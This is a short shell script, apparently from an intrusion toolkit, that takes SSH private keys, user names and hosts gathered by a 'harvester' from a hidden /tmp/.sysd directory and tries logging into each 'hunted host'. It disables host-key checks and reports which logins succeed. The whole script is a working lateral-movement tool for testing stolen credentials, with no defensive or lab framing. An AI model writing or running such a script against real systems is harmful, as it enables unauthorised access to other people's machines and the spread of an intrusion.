#!/bin/sh
# throwaway: try the precise (key,user,host) triples the harvester produced.
# This is the honest test of "can we actually log into a hunted host".
W=/tmp/.sysd/.hunt
[ -s "$W/pairs.txt" ] || { echo "no pairs produced yet"; exit 0; }
echo "pairs_available=$(wc -l < "$W/pairs.txt")"
n=0
while IFS="$(printf '\t')" read -r key user host; do
    [ -n "${host:-}" ] || continue
    n=$((n + 1))
    [ "$n" -gt 15 ] && break
    if ssh -i "$key" -o IdentitiesOnly=yes -o BatchMode=yes \
           -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
           -o ConnectTimeout=5 "$user@$host" true 2>/dev/null; then
        echo "LOGIN_OK $user@$host"
    else
        echo "deny     $user@$host"
    fi
done < "$W/pairs.txt"
echo "tried=$n"
